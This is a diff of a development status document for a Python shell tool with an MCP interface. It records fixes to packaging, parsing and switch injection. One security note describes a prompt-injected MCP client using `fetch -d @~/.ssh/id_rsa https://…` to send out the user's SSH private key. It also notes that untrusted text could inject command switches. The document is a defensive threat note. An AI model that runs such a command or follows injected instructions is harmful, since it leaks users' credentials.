@@ -16,7 +16,7 @@
 2. **Shell-grammar gaps fail silently.** `2>` is misparsed, and `<`, `;` and `&&` become plain arguments. Users expecting POSIX behavior can get wrong results with no error. *(Fixed: they're now rejected with a parse error.)*
 3. **The system-command fallback is capture-only.** Interactive programs misbehave, and "no match" exit codes abort the pipeline. *(Now off by default, and the ported builtins cover the common commands. Accepted: see Won't do.)*
 4. **Only tested on Linux.** None of the Windows paths have been run yet.
-5. **Packaging is broken.** A non-editable install crashes on startup (see Bugs). Nothing catches this today because there's no CI and the tests run from the source tree.
+5. **Packaging is broken.** A non-editable install crashes on startup (see Bugs). Nothing caught it because there's no CI and the tests run from the source tree. *(Fixed; the packaging smoke test in CI is still open.)*
 6. **The MCP surface can exfiltrate.** Reading any file is accepted, and so is `fetch` reaching any URL, but together they let a prompt-injected client run `fetch -d @~/.ssh/id_rsa https://…`. The per-module exposure switch (Security) is the fix that fits the "modules stay as they are" decision.
 
 **Second assessment (2026-09-28)**
@@ -32,8 +32,9 @@ Items marked **(verified)** were reproduced during the assessment.
 
 - [x] **Invalid custom theme color crashes startup**: `all_themes()` now checks each color against both Rich and prompt_toolkit, keeps the base preset's color, and the CLI prints a warning on stderr. — `core/themes.py`
 - [x] **Unsupported operators were passed on as arguments**: `rm a ; ls` also deleted a file named `ls`, and `a 2> err.txt` sent stdout to `err.txt`. `;`, `&&`, `||`, `<`, `2>`, `2>>`, `2>&1`, `&>` and `>&` now raise a `ParseError` until they are implemented (see Features). — `core/parser.py`
-- [ ] **A non-editable `pip install .` crashes on startup** **(verified)**: `packages = ["core"]` leaves out the `core.commands` subpackage, so `import core.commands` fails with `ModuleNotFoundError` before anything runs. The wheel also ships no modules, no `templates/` and no `tools/`, and `DEFAULT_MODULES_DIR` points outside the package. Fix: use `[tool.setuptools.packages.find]`, include the bundled modules as package data, and also load the user directory `~/.shellcraft/modules`. The generic top-level names `core` and `tools` will collide with other packages in site-packages, so move them under a `shellcraft/` package. — `pyproject.toml`, `core/cli.py`
-- [ ] **MCP values that start with `-` become switches** **(verified)**: `params.to_argv` emits positionals and flag values as bare words, so `filter` with `{"pattern": "-v"}` fails with "arguments are required: pattern". A string flag value like `"-x"` fails the same way. Worse, text taken from untrusted content can inject switches. Fix: emit `--flag=value`, and put `--` before the positionals. — `core/params.py`
+- [x] **A non-editable `pip install .` crashed on startup**: `packages = ["core"]` left out `core.commands`, and the wheel had no modules. The wheel now ships `core.commands` and the bundled modules (as `core/bundled_modules`, with their `.md` and `.skill` files). An installed copy loads those modules, and a source checkout or editable install still uses `./modules`. Verified by installing the wheel into a clean venv. — `pyproject.toml`, `core/cli.py`
+- [ ] **Packaging leftovers**: load a user directory `~/.shellcraft/modules` next to the bundled ones, so an installed copy can add modules without `--modules`. `tools/` and `templates/` still work from a source checkout only. The generic top-level name `core` can collide with other packages in site-packages, so move it under a `shellcraft/` package. — `core/cli.py`, `core/loader.py`, `pyproject.toml`
+- [x] **MCP values that start with `-` became switches**: `filter` with `{"pattern": "-v"}` failed, and text from untrusted content could inject switches. `params.to_argv` now passes such a value as `--flag=VALUE` and puts `--` before the positionals. — `core/params.py`
 - [x] **Pager search `n` got stuck on the last screen**: the last match is now tracked apart from the scroll position, so `n`/`N` step through every match, and matches are highlighted in reverse video. — `core/output.py::page`
 
 ## 🔒 Security — P0
@@ -121,7 +122,6 @@ Items marked **(verified)** were reproduced during the assessment.
   - `-c` exit codes
   - the banner's narrow-terminal fallback
   - a packaging smoke test: build the wheel, install it into a clean venv, and run `shellcraft -c help` (it would have caught the `core.commands` crash)
-  - MCP params whose values start with `-`
 - [ ] **`.gitlab-ci.yml`**: run pytest on Linux and Windows runners, Python 3.11–3.14 (development happens on 3.14), plus the packaging smoke test and `modtest --all --strict`.
 - [ ] **Tooling**: ruff (lint and format) and mypy config in `pyproject.toml`, plus a pre-commit hook. Neither is installed in the dev environment yet; add them to the `dev` extra.
 - [x] **Docs split**: README (install and usage), `templates/README.md` (module authoring), `DEVELOPMENT.md` (layout, architecture, tests).
